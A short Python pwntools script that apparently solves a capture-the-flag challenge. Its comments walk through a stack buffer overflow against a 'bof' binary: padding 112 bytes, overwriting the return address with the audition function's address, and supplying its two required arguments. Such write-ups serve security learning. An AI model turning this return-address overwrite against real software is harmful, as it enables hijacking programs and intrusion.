from pwn import *

if 'rem' in sys.argv:
    conn = remote('ctf.umbccd.io', 4000)
else:
    conn = process('./bof')

for i in range(4):
    print(conn.recvline().decode())

conn.send('\n') # I really don't care about the name array.

print(conn.recvline().decode())

## 0xffffd26c is the memory address of the song[50] character array.
## 0xffffd2dc is the location where the address will be pulled off the stack.
## We need to fill up 112 bytes to get to the stack pointer.
## Then, we need to write the memory address of our function we want to call.
## In this case, we want to call audition, which is stored at 0x08049182
## Remember those random 4 bytes that were reserved? We have to overwrite that, too.
## Then we need to write the operands of the audition function. It takes two integers, time and room_num.
## The source code tells us that time has to equal 1200 and room_num has to equal 366, so we write that to the stack.
## And that's it!

conn.send(((0xffffd2dc - 0xffffd26c) * b'A') + struct.pack('I', 0x08049182) + (4 * b'Z') + struct.pack('I', 1200) + struct.pack('I', 366))

conn.send('\n') ## Equivalent to pressing enter on your keyboard. A line break has it's own ascii code, 0x0a, or decimal 10.

print(conn.recv().decode())
